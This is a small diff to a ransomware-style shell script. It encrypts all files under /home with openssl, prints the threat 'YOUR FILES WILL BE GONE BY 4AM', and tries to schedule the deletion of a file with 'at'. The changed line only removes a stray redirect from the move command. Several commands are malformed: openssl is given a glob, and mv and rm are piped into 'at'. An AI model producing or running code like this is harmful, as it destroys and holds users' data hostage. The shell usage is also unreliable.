@@ -10,4 +10,4 @@ openssl enc -aes-256-cbc -pbkdf2 -salt -in /home/* -out encrypted.dat -pass file
 
 echo "YOUR FILES WILL BE GONE BY 4AM"
 
-mv normal_file.txt > /home | at 3:59am ; rm /home/normal_file.txt | at 4am 
+mv normal_file.txt /home | at 3:59am ; rm /home/normal_file.txt | at 4am 
